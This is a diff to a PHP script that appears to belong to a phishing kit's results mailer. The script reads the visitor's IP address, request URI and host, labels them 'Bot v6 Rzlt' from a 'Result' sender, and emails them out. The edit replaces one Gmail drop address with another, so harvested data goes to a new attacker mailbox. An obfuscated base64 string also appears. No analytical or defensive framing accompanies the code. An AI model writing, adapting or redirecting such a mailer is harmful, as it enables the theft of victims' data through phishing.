@@ -9,7 +9,7 @@ $str = 'WmFjXw==';echo base64_decode($str);
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
 $subj98 = " Bot v6 Rzlt |$ip";
-$email = "abeeeee707@gmail.com";
+$email = "buatnuyulea@gmail.com";
 $from = "From: Result<botv3@mrspybotv3.com";
 $a45 = $_SERVER['REQUEST_URI'];
 $b75 = $_SERVER['HTTP_HOST'];
